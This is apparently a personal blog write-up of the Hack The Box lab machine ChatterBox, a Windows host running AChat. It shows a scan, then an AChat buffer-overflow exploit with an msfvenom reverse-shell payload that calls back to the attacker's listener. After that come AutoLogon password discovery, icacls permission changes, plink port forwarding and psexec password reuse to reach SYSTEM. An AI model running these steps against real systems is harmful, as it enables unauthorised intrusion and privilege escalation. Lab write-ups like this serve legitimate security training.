---
title: Hack The Box - ChatterBox (Without Metasploit)
date: 2021-01-23 17:15:00 +0800
categories: [hackthebox]
tags: [windows, achat]
---

![](/assets/images/chatterbox.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.74 chatterbox.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a chatterbox.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.74:9255
Open 10.10.10.74:9256
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-23 05:45 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Initiating Connect Scan at 05:45
Scanning chatterbox.htb (10.10.10.74) [2 ports]
Discovered open port 9256/tcp on 10.10.10.74
Discovered open port 9255/tcp on 10.10.10.74
Completed Connect Scan at 05:45, 0.01s elapsed (2 total ports)
Initiating Service scan at 05:45
Scanning 2 services on chatterbox.htb (10.10.10.74)
Completed Service scan at 05:45, 6.04s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.74.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.33s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Nmap scan report for chatterbox.htb (10.10.10.74)
Host is up, received user-set (0.0092s latency).
Scanned at 2021-01-23 05:45:47 UTC for 6s

PORT     STATE SERVICE REASON  VERSION
9255/tcp open  http    syn-ack AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   syn-ack AChat chat system

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```

# Enumeration (1)

## Port 9255 `AChat chat system httpd`

It seemed like a web server was running on this port, but I was not able to visit any pages. Using `searchsploit`, we found out that `AChat` had a remote buffer overflow vulnerability that we can exploit.

```bash
$ searchsploit Achat                 
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                     | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)        | windows/remote/36056.rb
```

# Exploitation (1)

After copying the script, I modified the script to contain the IP address of the machine.

```python
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)
```

I also generated a payload using `msfvenom`:

```bash
$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1337 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
...
```

And replace the payload in the script with the payload that `msfvenom` generated. I then started my `nc` listener:

```bash
$ rlwrap nc -lvnp 1337                                
listening on [any] 1337 ...
```

And executed the script:

```bash
$ python 36025.py                      
---->{P00F}!
```

On our listener, we get a shell as `alfred`.

```bash
$ rlwrap nc -lvnp 1337                                
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.74] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
chatterbox\alfred

C:\Windows\system32>
```

# user.txt

The user flag is in `alfred`'s Desktop.

```
type user.txt
32d8XXXXXXXXXXXXXXXXXXXXXXXXXXXX

C:\Users\Alfred\Desktop>
```

# Enumeration (2)

After transferring `winpeasany.exe` over from my machine, we see some interesting things.

```
C:\temp> winpeasany.exe
...
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!

  [+] Home folders found
    C:\Users\Administrator : Alfred [AllAccess]
    C:\Users\Alfred : Alfred [AllAccess]
... 
```

## Full Access on `Administrator`'s Desktop

Thats weird, we see that `Alfred` has `AllAccess` on `Administrator`'s home folder!. Digging deeper we see that `Alfred` also has `FullAccess` on `Administrator`'s Desktop.

```
C:\Users\Administrator\Desktop>icacls C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop Everyone:(F)
                               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                               CHATTERBOX\Administrator:(I)(OI)(CI)(F)
                               BUILTIN\Administrators:(I)(OI)(CI)(F)
                               CHATTERBOX\Alfred:(I)(OI)(CI)(F)
```

This means we could add `Read` Access to all files on the Desktop, including `root.txt` and be able to read the flag!

```
icacls C:\Users\Administrator\Desktop /grant "Alfred":F /t 
processed file: .
processed file: .\desktop.ini
processed file: .\root.txt
Successfully processed 3 files; Failed processing 0 files
```

## Password Reuse

After uploading a `plink.exe`, we can perform port forwarding and be able to reach the port `445` which is only available via `localhost`.

```
C:\temp\plink.exe -l root -pw root 10.10.XX.XX -R 445:127.0.0.1:445 -P 2222
```

Then from our machine, we can use `psexec` and specify the `Administrator` username along with the password of `Alfred`.

```bash
$ psexec.py "Administrator:Welcome1\!@127.0.0.1" 
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file AYnhrfTP.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service OMxU on 127.0.0.1.....
[*] Starting service OMxU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We got a shell as `SYSTEM`!

# root.txt

The root flag is in `Administrator`'s Desktop.

```
type root.txt
56e9XXXXXXXXXXXXXXXXXXXXXXXXXXXX
C:\Users\Administrator\Desktop>
``` 

### Rooted ! Thank you for reading and look forward for more writeups and articles !